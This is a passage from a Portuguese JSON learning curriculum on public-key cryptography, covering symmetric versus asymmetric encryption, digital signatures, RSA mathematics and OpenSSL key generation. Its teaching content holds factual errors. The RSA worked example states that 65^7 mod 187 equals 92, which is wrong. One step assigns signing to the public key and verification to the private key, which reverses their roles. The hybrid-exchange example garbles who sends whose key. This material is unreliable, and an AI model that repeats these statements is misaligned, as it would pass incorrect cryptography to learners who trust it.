                    ]
                  },
                  {
                    "id": "10.1.2.4",
                    "name": "Criptografia de Chave Pública",
                    "description": "Sistemas assimétricos com chaves pública e privada, como RSA e ECC, para confidencialidade e assinatura digital.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.4.1",
                        "name": "Sistemas de Criptografia Assimétrica",
                        "description": "Princípios fundamentais dos sistemas assimétricos, que utilizam um par de chaves criptográficas: uma chave pública para criptografia ou verificação e uma chave privada para descriptografia ou assinatura, resolvendo o problema da distribuição de chaves na criptografia simétrica.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.4.1.1",
                            "name": "Diferenciar Criptografia Simétrica e Assimétrica",
                            "description": "Comparar as características, vantagens e desvantagens da criptografia simétrica (uma chave compartilhada) versus assimétrica (chaves pública e privada), identificando cenários de uso como confidencialidade em comunicações seguras.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos da Criptografia Simétrica",
                                  "subSteps": [
                                    "Defina criptografia simétrica como um método que usa uma única chave compartilhada para criptografar e descriptografar dados.",
                                    "Estude algoritmos comuns como AES e DES, focando em sua velocidade e simplicidade.",
                                    "Analise o processo: remetente criptografa com a chave, destinatário descriptografa com a mesma chave.",
                                    "Identifique o problema principal: distribuição segura da chave compartilhada.",
                                    "Crie um diagrama simples ilustrando o fluxo de dados."
                                  ],
                                  "verification": "Escreva uma definição em suas palavras e desenhe um diagrama do processo.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Vídeo introdutório sobre AES (YouTube)",
                                    "Papel e caneta para diagrama",
                                    "Artigo da Wikipedia sobre Criptografia Simétrica"
                                  ],
                                  "tips": [
                                    "Use analogias como uma caixa de correio com a mesma chave para ambos os lados.",
                                    "Memorize: uma chave para tudo!"
                                  ],
                                  "learningObjective": "Ao final deste passo, você será capaz de explicar o funcionamento básico da criptografia simétrica e seu principal desafio.",
                                  "commonMistakes": [
                                    "Confundir a chave simétrica com chaves públicas/privadas.",
                                    "Achar que é mais segura que a assimétrica sem contexto."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender os Fundamentos da Criptografia Assimétrica",
                                  "subSteps": [
                                    "Defina criptografia assimétrica como um método que usa um par de chaves: pública (para criptografar) e privada (para descriptografar).",
                                    "Estude algoritmos como RSA e ECC, destacando o uso de matemática avançada (fatores primos).",
                                    "Analise o processo: qualquer um criptografa com a chave pública, só o dono da privada descriptografa.",
                                    "Discuta benefícios como não precisar compartilhar a chave secreta.",
                                    "Crie um diagrama contrastando com o simétrico."
                                  ],
                                  "verification": "Descreva o par de chaves e desenhe um diagrama do processo de criptografia/descriptografia.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Vídeo sobre RSA (Khan Academy)",
                                    "Simulador online de chaves assimétricas (Crypto101)",
                                    "Papel para diagrama"
                                  ],
                                  "tips": [
                                    "Pense na chave pública como um cadeado aberto que qualquer um pode usar para fechar.",
                                    "A privada é a única que abre: assimétrica!"
                                  ],
                                  "learningObjective": "Ao final, você explicará como a assimétrica resolve o problema de distribuição de chaves.",
                                  "commonMistakes": [
                                    "Invertir funções: pública descriptografa (errado).",
                                    "Achar que é mais rápida que simétrica."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Características, Vantagens e Desvantagens",
                                  "subSteps": [
                                    "Liste características: simétrica (rápida, uma chave); assimétrica (segura para troca, duas chaves).",
                                    "Compare vantagens: simétrica (eficiente para grandes dados); assimétrica (autenticação, não compartilha segredo).",
                                    "Liste desvantagens: simétrica (distribuição chave); assimétrica (lenta, computacionalmente intensiva).",
                                    "Crie uma tabela de comparação com colunas para cada tipo.",
                                    "Discuta cenários híbridos onde ambas são usadas."
                                  ],
                                  "verification": "Preencha e revise uma tabela de comparação com pelo menos 5 linhas de pros/cons.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Planilha Google Sheets ou papel para tabela",
                                    "Infográfico comparativo (buscar 'symmetric vs asymmetric')"
                                  ],
                                  "tips": [
                                    "Use tabelas para visualização clara.",
                                    "Lembre: simétrica para volume, assimétrica para inicialização."
                                  ],
                                  "learningObjective": "Você será capaz de listar e justificar 3 vantagens/desvantagens de cada tipo.",
                                  "commonMistakes": [
                                    "Ignorar que assimétrica é usada para troca de chaves simétricas.",
                                    "Superestimar velocidade da assimétrica."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar Cenários de Uso Apropriados",
                                  "subSteps": [
                                    "Liste usos simétrica: armazenamento de arquivos, VPNs (alta velocidade).",
                                    "Liste usos assimétrica: assinaturas digitais, troca de chaves em HTTPS, emails PGP.",
                                    "Analise por que: confidencialidade em comunicações seguras (ex: TLS usa ambas).",
                                    "Pesquise 2 exemplos reais e explique a escolha do tipo.",
                                    "Crie um fluxograma de decisão: quando usar qual."
                                  ],
                                  "verification": "Escreva 3 cenários com justificativa para simétrica ou assimétrica.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Artigo sobre TLS/HTTPS",
                                    "Exemplos de PGP e SSH"
                                  ],
                                  "tips": [
                                    "Pergunte: precisa de velocidade ou autenticação segura?",
                                    "Híbrido é comum no mundo real."
                                  ],
                                  "learningObjective": "Você identificará corretamente cenários ideais para cada tipo de criptografia.",
                                  "commonMistakes": [
                                    "Usar simétrica para autenticação (insegura).",
                                    "Achar assimétrica ideal para todos os casos."
                                  ]
                                }
                              ],
                              "practicalExample": "Simule uma conversa segura: Alice e Bob usam simétrica (mesma senha 'abc123') para mensagens rápidas em um chat privado. Para iniciar, usam assimétrica: Bob envia chave pública de Alice, ela criptografa a senha simétrica com ela e envia; só Alice descriptografa com privada. Teste com ferramenta online como CyberChef.",
                              "finalVerifications": [
                                "Explique em 1 minuto a diferença principal entre simétrica e assimétrica.",
                                "Preencha uma tabela comparativa sem erros.",
                                "Dê 2 exemplos reais de uso de cada uma.",
                                "Descreva um cenário híbrido como HTTPS.",
                                "Identifique por que simétrica é mais rápida.",
                                "Crie um fluxograma de decisão para escolher o tipo."
                              ],
                              "assessmentCriteria": [
                                "Precisão nas definições de chaves e processos (90% correto).",
                                "Correta listagem de pelo menos 3 vantagens/desvantagens por tipo.",
                                "Identificação precisa de 4 cenários de uso reais.",
                                "Uso de analogias ou diagramas claros na explicação.",
                                "Ausência de confusões comuns como inversão de funções de chaves.",
                                "Demonstração de entendimento híbrido (ex: TLS)."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria dos números primos e modularidade no RSA.",
                                "História: Evolução da criptografia de Enigma (simétrica) a PGP (assimétrica).",
                                "Redes de Computadores: Protocolos TLS/SSL que combinam ambos.",
                                "Ética: Implicações de privacidade em comunicações seguras."
                              ],
                              "realWorldApplication": "No HTTPS de sites bancários, criptografia assimétrica (RSA) autentica o servidor e troca uma chave simétrica (AES), que criptografa todos os dados da sessão para velocidade e confidencialidade."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.1.2",
                            "name": "Explicar o Processo de Criptografia e Descriptografia Assimétrica",
                            "description": "Descrever o fluxo: uso da chave pública do destinatário para criptografar a mensagem (confidencialidade) e da chave privada para descriptografar, garantindo que apenas o destinatário autorizado acesse o conteúdo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Básicos de Chaves Assimétricas",
                                  "subSteps": [
                                    "Defina chave pública e chave privada em um par assimétrico.",
                                    "Explique que a chave pública é compartilhada abertamente, enquanto a privada é secreta.",
                                    "Discuta como as chaves são matematicamente relacionadas, mas uma não deriva da outra facilmente.",
                                    "Identifique o papel de cada chave: pública para criptografar, privada para descriptografar.",
                                    "Compare com criptografia simétrica para destacar a diferença."
                                  ],
                                  "verification": "Escreva definições curtas e um diagrama simples mostrando o par de chaves.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Papel e caneta para diagrama",
                                    "Vídeo introdutório sobre RSA (ex: Khan Academy)"
                                  ],
                                  "tips": "Use analogia de caixa de correio: chave pública é o cadeado aberto para todos, privada é a chave única.",
                                  "learningObjective": "Entender a distinção e o propósito fundamental das chaves pública e privada.",
                                  "commonMistakes": [
                                    "Confundir funções das chaves",
                                    "Achar que chaves públicas são 'fracas'"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explicar o Processo de Criptografia com Chave Pública",
                                  "subSteps": [
                                    "Descreva o remetente obtendo a chave pública do destinatário de um diretório público.",
                                    "Mostre como a mensagem em texto plano é transformada usando a chave pública (ex: algoritmo RSA).",
                                    "Explique que o resultado é texto cifrado, ilegível sem a chave privada.",
                                    "Discuta a garantia de confidencialidade: qualquer um pode criptografar, mas só o dono da privada descriptografa.",
                                    "Simule com um exemplo numérico simples de exponenciação modular."
                                  ],
                                  "verification": "Criptografe uma mensagem curta manualmente com um exemplo básico e explique o passo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Calculadora para modularidade",
                                    "Ferramenta online como RSA demo (ex: Crypto101)"
                                  ],
                                  "tips": "Lembre-se: chave pública ENTRADA na função de criptografia garante que só o destinatário leia.",
                                  "learningObjective": "Dominar como e por que a chave pública garante confidencialidade na criptografia.",
                                  "commonMistakes": [
                                    "Usar chave privada para criptografar",
                                    "Ignorar distribuição segura da chave pública"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explicar o Processo de Descriptografia com Chave Privada",
                                  "subSteps": [
                                    "Descreva o destinatário recebendo o texto cifrado.",
                                    "Explique aplicar a chave privada na função de descriptografia para recuperar o texto plano.",
                                    "Mostre matematicamente como a relação das chaves inverte o processo.",
                                    "Verifique que apenas a chave privada correspondente funciona, rejeitando outras.",
                                    "Discuta proteção contra interceptação: cifrado é inútil sem a privada."
                                  ],
                                  "verification": "Descriptografe um texto cifrado fornecido usando passos manuais ou simulador.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Simulador RSA online",
                                    "Papel para cálculos manuais"
                                  ],
                                  "tips": "Pense na chave privada como 'a única chave que abre a fechadura pública'.",
                                  "learningObjective": "Compreender o mecanismo reverso que assegura acesso exclusivo.",
                                  "commonMistakes": [
                                    "Achar que descriptografia usa chave pública",
                                    "Subestimar complexidade computacional"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar o Fluxo Completo e Benefícios",
                                  "subSteps": [
                                    "Monte o fluxo end-to-end: geração de chaves > distribuição pública > criptografia > transmissão > descriptografia.",
                                    "Explique cenários de uso: email seguro, assinatura digital.",
                                    "Discuta limitações: overhead computacional, necessidade de troca segura inicial.",
                                    "Compare com simétrica: assimétrica resolve problema de troca de chaves.",
                                    "Crie um diagrama de fluxo completo."
                                  ],
                                  "verification": "Desenhe e narre o fluxo completo para um parceiro ou em voz alta.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama como Draw.io",
                                    "Exemplos de protocolos como PGP"
                                  ],
                                  "tips": "Use setas em diagrama: Mensagem -> Chave Pub -> Cifrado -> Chave Priv -> Mensagem.",
                                  "learningObjective": "Sintetizar o processo assimétrico como solução para confidencialidade segura.",
                                  "commonMistakes": [
                                    "Omitir geração/distribuição de chaves",
                                    "Confundir com autenticação"
                                  ]
                                }
                              ],
                              "practicalExample": "Alice quer enviar uma mensagem confidencial 'Reunião às 14h' para Bob. Ela obtém a chave pública de Bob, criptografa a mensagem resultando em 'X7f9k2pQ...', envia. Bob usa sua chave privada para descriptografar e lê a mensagem original. Um eavesdropper intercepta o cifrado, mas não consegue ler sem a privada de Bob.",
                              "finalVerifications": [
                                "Descreva verbalmente o fluxo de A para B sem hesitação.",
                                "Crie um diagrama preciso do processo assimétrico.",
                                "Explique por que garante confidencialidade contra interceptadores.",
                                "Diferencie de criptografia simétrica corretamente.",
                                "Simule criptografia/descriptografia com ferramenta online.",
                                "Identifique onde falharia se chave privada vazasse."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção de funções das chaves pública/privada (90%+ correto).",
                                "Clareza no fluxo end-to-end com exemplo prático.",
                                "Uso correto de terminologia (confidencialidade, assimétrica, etc.).",
                                "Capacidade de explicar limitações e benefícios.",
                                "Diagrama ou simulação funcional sem erros.",
                                "Resposta a perguntas hipotéticas sobre falhas no processo."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria dos Números (fatores primos, modularidade em RSA).",
                                "História da Computação: Evolução da criptografia (Diffie-Hellman, Rivest-Shamir-Adleman).",
                                "Física/Engenharia: Analogias quânticas em criptografia pós-quântica.",
                                "Ética/Lei: Implicações legais de privacidade e criptografia (ex: leis de dados)."
                              ],
                              "realWorldApplication": "Usado em HTTPS/TLS para navegação segura (browsers criptografam com chave pública do servidor), PGP para emails confidenciais, blockchain para transações seguras, e VPNs para túneis criptografados, protegendo comunicações diárias contra espionagem."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.4.1.1"
                            ]
                          },
                          {
                            "id": "10.1.2.4.1.3",
                            "name": "Compreender Assinatura Digital",
                            "description": "Explicar como a chave privada é usada para assinar uma mensagem (gerando um hash criptográfico assinado) e a chave pública para verificar a integridade e autenticidade, prevenindo repúdio e adulteração.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Conceitos Fundamentais de Hash e Chaves Assimétricas",
                                  "subSteps": [
                                    "Estude o que é uma função hash: uma transformação unidirecional que gera um valor fixo (digest) a partir de qualquer entrada.",
                                    "Aprenda sobre pares de chaves assimétricas: chave privada (secreta) e chave pública (pública).",
                                    "Compreenda que a chave privada é usada para assinar e a pública para verificar.",
                                    "Identifique a importância do hash na assinatura para eficiência.",
                                    "Diferencie hash de criptografia simétrica e assimétrica."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito os conceitos de hash e chaves assimétricas, dando exemplos simples.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Vídeo explicativo sobre funções hash (ex: Khan Academy)",
                                    "Diagrama de chaves pública/privada",
                                    "Artigo sobre criptografia assimétrica"
                                  ],
                                  "tips": "Use analogias como 'hash é como uma impressão digital única de um documento'.",
                                  "learningObjective": "Dominar os blocos básicos necessários para assinatura digital.",
                                  "commonMistakes": [
                                    "Confundir hash com criptografia reversível",
                                    "Achar que chave pública assina mensagens"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar uma Assinatura Digital com Chave Privada",
                                  "subSteps": [
                                    "Crie ou obtenha um par de chaves assimétricas (ex: usando RSA).",
                                    "Calcule o hash da mensagem original (ex: SHA-256).",
                                    "Assine o hash com a chave privada, gerando a assinatura digital.",
                                    "Combine mensagem original + hash + assinatura para o pacote assinado.",
                                    "Teste em ferramenta online como CryptoJS ou OpenSSL."
                                  ],
                                  "verification": "Gere uma assinatura para uma mensagem de teste e salve o resultado.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta online de geração de chaves RSA (ex: cryptool.org)",
                                    "Editor de texto para mensagens",
                                    "Biblioteca JavaScript como CryptoJS"
                                  ],
                                  "tips": "Sempre use mensagens curtas para testes iniciais para visualizar o processo.",
                                  "learningObjective": "Executar o processo de assinatura passo a passo.",
                                  "commonMistakes": [
                                    "Assinar a mensagem inteira em vez do hash",
                                    "Usar chave pública para assinar"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Verificar a Assinatura Digital com Chave Pública",
                                  "subSteps": [
                                    "Receba o pacote: mensagem, hash e assinatura.",
                                    "Calcule o hash da mensagem recebida.",
                                    "Use a chave pública para descriptografar a assinatura e obter o hash original.",
                                    "Compare os hashes: se iguais, a assinatura é válida.",
                                    "Teste com adulteração para ver falha na verificação."
                                  ],
                                  "verification": "Verifique com sucesso uma assinatura válida e detecte falha em uma adulterada.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Mesma ferramenta do Step 2",
                                    "Chave pública correspondente",
                                    "Mensagens alteradas para teste"
                                  ],
                                  "tips": "Altere uma letra na mensagem para ver como o hash muda drasticamente.",
                                  "learningObjective": "Compreender e executar a verificação de integridade e autenticidade.",
                                  "commonMistakes": [
                                    "Comparar hashes errados",
                                    "Usar chave errada na verificação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Propriedades e Prevenção de Ataques",
                                  "subSteps": [
                                    "Explique integridade: hash garante não adulteração.",
                                    "Descreva autenticidade: só chave privada do dono assina corretamente.",
                                    "Entenda não-repúdio: assinante não pode negar a assinatura.",
                                    "Discuta ataques comuns: colisão de hash, roubo de chave privada.",
                                    "Relacione com cenários reais como emails assinados (PGP)."
                                  ],
                                  "verification": "Responda a perguntas sobre propriedades e dê exemplos de prevenção.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Infográfico sobre propriedades de assinatura digital",
                                    "Casos de estudo de ataques criptográficos"
                                  ],
                                  "tips": "Pense em 'não-repúdio' como um contrato assinado à mão.",
                                  "learningObjective": "Associar o processo técnico às garantias de segurança.",
                                  "commonMistakes": [
                                    "Ignorar colisões de hash como risco",
                                    "Confundir não-repúdio com confidencialidade"
                                  ]
                                }
                              ],
                              "practicalExample": "Assine digitalmente um contrato PDF usando Adobe Acrobat ou ferramenta como DocuSign: gere hash do documento, assine com chave privada via certificado digital, e verifique com chave pública do destinatário para confirmar autenticidade.",
                              "finalVerifications": [
                                "Explicar o fluxo completo: hash -> assinatura privada -> verificação pública.",
                                "Demonstrar assinatura e verificação em ferramenta prática.",
                                "Identificar falhas ao adulterar mensagem.",
                                "Definir integridade, autenticidade e não-repúdio corretamente.",
                                "Dar exemplo real de uso em cibersegurança.",
                                "Discutir limitações como dependência de segurança da chave privada."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição do processo de assinatura e verificação (80% corretude).",
                                "Capacidade de demonstrar com ferramenta prática sem erros.",
                                "Compreensão clara das três propriedades de segurança.",
                                "Identificação correta de pelo menos dois erros comuns e prevenções.",
                                "Explicação fluida e uso de terminologia técnica adequada.",
                                "Criatividade em exemplos práticos e conexões reais."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria dos números e algoritmos como RSA e SHA.",
                                "Programação: Implementação em linguagens como Python (cryptography lib).",
                                "Direito: Conceitos de contratos digitais e validade jurídica (ex: MP 2.200-2).",
                                "História da Computação: Evolução da criptografia pós-Enigma.",
                                "Ética: Implicações de privacidade e responsabilidade em assinaturas."
                              ],
                              "realWorldApplication": "Em bancos para autorizar transações (ex: Pix assinado), governos para documentos oficiais (ICP-Brasil), emails corporativos (S/MIME) e blockchain para transações imutáveis, garantindo que ninguém negue ações ou altere dados."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.4.1.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.4.2",
                        "name": "Algoritmo RSA",
                        "description": "Algoritmo de criptografia de chave pública baseado na dificuldade computacional da fatoração de produtos de dois grandes números primos, amplamente utilizado para troca de chaves e assinaturas digitais.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.4.2.1",
                            "name": "Entender a Matemática do RSA",
                            "description": "Compreender os passos matemáticos: seleção de primos p e q, cálculo de n = p*q e φ(n), escolha de e (expoente público) coprimo com φ(n), cálculo de d (expoente privado) como inverso modular de e, e operações de criptografia C = M^e mod n e descriptografia M = C^d mod n.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Selecionar Números Primos p e q",
                                  "subSteps": [
                                    "Estude a importância de primos grandes e distintos para segurança.",
                                    "Use testes de primalidade (divisibilidade por primos menores que sqrt(n)).",
                                    "Escolha p=17 e q=11 como exemplo inicial.",
                                    "Verifique manualmente: 17 e 11 não têm divisores além de 1 e si mesmos.",
                                    "Registre os valores escolhidos."
                                  ],
                                  "verification": "Confirme que p e q são primos testando divisores até sqrt(p) e sqrt(q).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Papel e caneta",
                                    "Calculadora para sqrt",
                                    "Lista de primos pequenos"
                                  ],
                                  "tips": "Comece com primos pequenos para prática; em produção, use geradores probabilísticos como Miller-Rabin.",
                                  "learningObjective": "Identificar e validar números primos adequados para a base do RSA.",
                                  "commonMistakes": [
                                    "Escolher números compostos como 15",
                                    "Selecionar p=q, violando unicidade"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Calcular n = p*q e φ(n) = (p-1)(q-1)",
                                  "subSteps": [
                                    "Multiplique p e q para obter n (módulo público).",
                                    "Calcule φ(n) usando a fórmula de Euler para primos distintos.",
                                    "Exemplo: n=17*11=187, φ(n)=(17-1)*(11-1)=16*10=160.",
                                    "Verifique o cálculo aritmético passo a passo.",
                                    "Explique o papel de φ(n) como totiente de Euler."
                                  ],
                                  "verification": "Resultado: n=187, φ(n)=160; confira multiplicação e subtrações.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Calculadora",
                                    "Planilha para anotações"
                                  ],
                                  "tips": "n deve ser difícil de fatorar; φ(n) é mantido privado.",
                                  "learningObjective": "Dominar o cálculo do módulo e totiente para setup RSA.",
                                  "commonMistakes": [
                                    "Erro na multiplicação de p*q",
                                    "Calcular φ(n) errado como p*q - p - q +1 incorretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Escolher e (Expoente Público) Coprimo com φ(n)",
                                  "subSteps": [
                                    "Escolha e pequeno (comum: 3,17,65537) tal que 1 < e < φ(n) e gcd(e, φ(n))=1.",
                                    "Exemplo: Teste e=7 com φ=160; gcd(7,160)=1.",
                                    "Use Algoritmo de Euclides para calcular gcd.",
                                    "Se gcd>1, incremente e e teste novamente.",
                                    "Registre e escolhido."
                                  ],
                                  "verification": "Calcule gcd(e, φ(n))=1 usando Euclides.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Calculadora para gcd",
                                    "Tabela de Euclides"
                                  ],
                                  "tips": "Prefira e ímpar e primo para eficiência; 65537 é padrão por ser Fermat prime.",
                                  "learningObjective": "Selecionar expoente público válido via coprimaridade.",
                                  "commonMistakes": [
                                    "Escolher e não coprimo",
                                    "e >= φ(n)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Calcular d (Expoente Privado) como Inverso Modular de e",
                                  "subSteps": [
                                    "Encontre d tal que (e * d) mod φ(n) = 1.",
                                    "Exemplo: Inverso de 7 mod 160; teste ou use Algoritmo Estendido de Euclides.",
                                    "Resultado: d=23, pois 7*23=161, 161 mod 160=1.",
                                    "Implemente Euclides estendido: expressar 1 como combinação linear.",
                                    "Verifique: e*d ≡ 1 mod φ(n)."
                                  ],
                                  "verification": "Confirme e*d mod φ(n) = 1.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Implementação Python opcional para inverso modular",
                                    "Papel para Euclides"
                                  ],
                                  "tips": "Use sympy.mod_inverse() para checagem rápida.",
                                  "learningObjective": "Computar inverso multiplicativo modular para chave privada.",
                                  "commonMistakes": [
                                    "Confundir com divisão simples",
                                    "Erro no sinal do coeficiente de Bézout"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Executar Criptografia e Descriptografia",
                                  "subSteps": [
                                    "Criptografe: C = M^e mod n (M=65, C=65^7 mod 187=279 mod 187=92).",
                                    "Descriptografe: M = C^d mod n (92^23 mod 187=65).",
                                    "Use exponenciação modular eficiente (square-and-multiply).",
                                    "Teste com múltiplas mensagens M < n.",
                                    "Explique por que funciona: Teorema de Euler (M^φ(n) ≡1 mod n)."
                                  ],
                                  "verification": "Descriptografar C deve retornar M original.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Python ou calculadora modular",
                                    "Exemplo numérico impresso"
                                  ],
                                  "tips": "Implemente pow(M, e, n) em Python para eficiência.",
                                  "learningObjective": "Aplicar operações RSA e compreender base teórica.",
                                  "commonMistakes": [
                                    "Exponenciação direta sem mod (números enormes)",
                                    "M >=n sem padding"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando p=17, q=11: n=187, φ(n)=160, e=7, d=23. Mensagem M=65 → C=65^7 mod 187=92 → 92^23 mod 187=65. Funciona!",
                              "finalVerifications": [
                                "Calcular chaves completas (n,e,d) a partir de p,q corretamente.",
                                "Criptografar e descriptografar 3 mensagens diferentes.",
                                "Explicar Teorema de Euler na base do RSA.",
                                "Identificar por que primos grandes são cruciais.",
                                "Simular ataque se p/q pequenos (fatoração).",
                                "Verificar gcd(e,φ(n))=1 e e*d mod φ(n)=1."
                              ],
                              "assessmentCriteria": [
                                "Precisão em todos os cálculos matemáticos (100% correto).",
                                "Compreensão conceitual: explicar cada fórmula verbalmente.",
                                "Eficiência: uso de algoritmos modulares sem erros de overflow.",
                                "Criatividade: testar mensagens variadas e analisar falhas.",
                                "Segurança: discutir implicações de chaves fracas.",
                                "Documentação: passos anotados claramente."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria dos Números (primalidade, Euclides, Euler).",
                                "Programação: Implementar RSA em Python/Java.",
                                "História: Evolução da criptografia (Diffie-Hellman a RSA).",
                                "Física: Ameaças quânticas (Shor para fatoração).",
                                "Ética: Privacidade digital e uso responsável de cripto."
                              ],
                              "realWorldApplication": "RSA protege comunicações HTTPS/SSL, assinaturas digitais em software, VPNs e blockchain (ex: Bitcoin wallets), garantindo confidencialidade e autenticidade na internet."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.4.1.3"
                            ]
                          },
                          {
                            "id": "10.1.2.4.2.2",
                            "name": "Gerar e Gerenciar Pares de Chaves RSA",
                            "description": "Demonstrar a geração de um par de chaves RSA usando ferramentas como OpenSSL, explicando parâmetros como tamanho de chave (ex: 2048 bits) e sua relação com a segurança contra ataques de fatoração.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos do Algoritmo RSA",
                                  "subSteps": [
                                    "Estude a base matemática do RSA: produto de dois números primos grandes (p e q), módulo n = p*q, expoentes públicos e privados.",
                                    "Aprenda sobre parâmetros chave: tamanho da chave (ex: 2048 bits para equilíbrio segurança-desempenho), relação com ataques de fatoração como Pollard's Rho.",
                                    "Diferencie chave pública (e, n) para criptografia e assinatura, e chave privada (d, n) para descriptografia e verificação.",
                                    "Analise impactos de tamanhos menores (1024 bits: vulnerável) vs. maiores (4096 bits: mais seguro, mas lento).",
                                    "Revise conceitos de assimetria: qualquer um criptografa com pública, só dono descriptografa com privada."
                                  ],
                                  "verification": "Resuma em um diagrama ou parágrafo os passos matemáticos da geração RSA e explique por que 2048 bits é padrão atual.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação RSA (Wikipedia ou RFC 8017)",
                                    "Vídeos tutoriais sobre criptografia assimétrica (Khan Academy ou YouTube)"
                                  ],
                                  "tips": "Use analogias como 'cofre com duas chaves' para fixar conceitos abstratos.",
                                  "learningObjective": "Entender os princípios matemáticos e parâmetros que garantem a segurança do RSA.",
                                  "commonMistakes": [
                                    "Confundir chaves pública e privada",
                                    "Ignorar a importância do tamanho da chave",
                                    "Achar que RSA é simétrico"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar e Configurar OpenSSL",
                                  "subSteps": [
                                    "Verifique se OpenSSL está instalado: execute 'openssl version' no terminal (Linux/Mac) ou baixe para Windows.",
                                    "Instale via gerenciador de pacotes: apt install openssl (Ubuntu), brew install openssl (Mac), ou chocolatey (Windows).",
                                    "Configure variáveis de ambiente se necessário: adicione PATH para binários OpenSSL.",
                                    "Teste instalação gerando um hash simples: 'openssl dgst -sha256 arquivo.txt'.",
                                    "Explore diretórios de configuração: localize openssl.cnf para customizações futuras."
                                  ],
                                  "verification": "Execute 'openssl version' e gere um hash de teste sem erros, confirmando funcionalidade.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Terminal/Command Prompt",
                                    "Documentação oficial OpenSSL (openssl.org)",
                                    "Guia de instalação por SO"
                                  ],
                                  "tips": "Use uma VM Linux para prática segura, evitando conflitos em sistemas principais.",
                                  "learningObjective": "Preparar o ambiente para geração de chaves com OpenSSL de forma confiável.",
                                  "commonMistakes": [
                                    "Instalar versão errada (32 vs 64 bits)",
                                    "Esquecer de reiniciar terminal após PATH",
                                    "Confundir com bibliotecas como PuTTYgen"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerar o Par de Chaves RSA",
                                  "subSteps": [
                                    "Crie diretório seguro: 'mkdir rsa_keys && cd rsa_keys && chmod 700 .'.",
                                    "Gere chave privada: 'openssl genrsa -out private_key.pem 2048' (use 2048 bits).",
                                    "Extraia chave pública: 'openssl rsa -in private_key.pem -pubout -out public_key.pem'.",
                                    "Personalize com passphrase: adicione '-aes256' na geração para encriptação.",
                                    "Verifique chaves: 'openssl rsa -in private_key.pem -text -noout' e similar para pública."
                                  ],
                                  "verification": "Confirme existência de private_key.pem e public_key.pem com conteúdo válido via 'head' ou verificação texto.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "OpenSSL instalado",
                                    "Terminal com permissões de escrita"
                                  ],
                                  "tips": "Sempre use pelo menos 2048 bits; armazene chaves em local protegido (permissões 600).",
                                  "learningObjective": "Executar comandos para gerar pares RSA seguros e funcionais.",
                                  "commonMistakes": [
                                    "Usar tamanho <2048 bits",
                                    "Não definir passphrase",
                                    "Permissões erradas em arquivos de chaves"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Gerenciar e Proteger Pares de Chaves RSA",
